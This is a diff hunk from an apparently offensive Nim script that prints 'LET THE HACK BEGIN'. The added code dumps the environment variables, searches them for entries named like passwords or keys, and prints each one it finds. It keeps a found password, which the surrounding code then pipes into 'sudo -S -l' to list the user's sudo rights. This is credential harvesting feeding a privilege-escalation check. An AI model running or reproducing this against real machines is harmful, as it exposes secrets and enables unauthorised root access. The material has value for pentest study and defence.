@@ -78,6 +78,17 @@ try:
     echo red, "!!! LET THE HACK BEGIN !!!", def
     echo ""
 
+    let paths_cmd = execCmdEx("env || set 2> /dev/null")
+    let paths_lines = paths_cmd[0].splitLines()
+    for line in paths_lines:
+        if "password" in line.toLowerAscii():
+            let passwd = line.split('=')
+            echo &"{green}INFO{def}: found password \"{green}{passwd}{def}\" in system env variables"
+            passw = passwd[1]
+        elif "key" in line.toLowerAscii():
+            let key = line.split('=')
+            echo &"{green}INFO{def}: found key \"{green}{key}{def}\" in system env variables"
+        
     if passw_knowed:
         let cmd = execCmdEx(&"echo {passw} | sudo -S -l")
         let whoami = execCmdEx(&"whoami")
